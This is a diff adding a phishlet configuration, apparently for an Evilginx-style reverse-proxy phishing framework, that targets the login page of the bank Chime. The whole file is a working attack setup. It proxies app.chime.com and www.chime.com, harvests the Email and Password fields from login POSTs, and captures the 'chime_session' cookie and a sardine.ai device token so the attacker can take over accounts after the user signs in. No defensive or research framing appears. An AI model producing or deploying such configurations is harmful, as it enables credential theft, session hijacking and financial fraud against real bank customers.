@@ -1,0 +1,38 @@
+name: 'member_login_chime'
+author: 'sean@rtlphishletgen'
+min_ver: '3.2.0'
+proxy_hosts:
+  - {phish_sub: 'app', orig_sub: 'app', domain: 'chime.com', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'chime.com', session: true, is_landing: false}
+sub_filters:
+  - {triggers_on: 'app.chime.com', orig_sub: 'www', domain: 'chime.com', search: 'www.chime.com', replace: 'www.chime.com',
+    mimes: [text/html, application/json, application/javascript, text/javascript]}
+  - {triggers_on: 'app.chime.com', orig_sub: 'www', domain: 'chime.com', search: 'www%2Echime%2Ecom', replace: 'www%2Echime%2Ecom',
+    mimes: [text/html, application/json, application/javascript, text/javascript]}
+auth_tokens:
+  - domain: '.app.chime.com'
+    keys:
+      - 'chime_session'
+  - domain: '.api.sardine.ai'
+    keys:
+      - '_immortal|deviceToken'
+credentials:
+  username:
+    key: 'Email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'Password'
+    search: '(.*)'
+    type: 'post'
+auth_urls:
+  - '/.*'
+login:
+  domain: 'app.chime.com'
+  path: '/login'
+force_post:
+  - path: '/login'
+    search:
+      - {key: 'Email', search: '(.*)'}
+      - {key: 'Password', search: '(.*)'}
+    type: 'post'
